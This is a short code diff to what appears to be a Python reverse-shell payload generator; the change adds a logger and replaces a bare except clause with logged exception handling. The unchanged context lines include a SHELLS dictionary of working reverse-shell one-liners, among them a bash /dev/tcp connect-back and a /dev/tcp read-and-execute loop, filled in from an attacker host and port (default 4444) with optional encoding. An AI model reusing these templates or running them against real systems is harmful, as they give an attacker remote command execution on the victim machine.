@@ -1,6 +1,10 @@
 import json, base64
 from typing import Dict, List, Optional
 
+from tools.log_utils import get_logger
+
+logger = get_logger("reverse_shell")
+
 SHELLS = {
     "bash_tcp": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
     "bash_readline": 'exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done',
@@ -81,7 +85,8 @@ def run(lhost: str = "LHOST", lport: int = 4444, encode: str = "raw") -> Dict:
                 encoded = ENCODERS[encode](cmd)
                 result["shells"].append({"name": name, "command": encoded,
                                           "encode": encode})
-            except:
+            except Exception as e:
+                logger.debug("encode %s/%s: %s", name, encode, e)
                 result["shells"].append({"name": name, "command": cmd,
                                           "encode": "raw"})
         else:
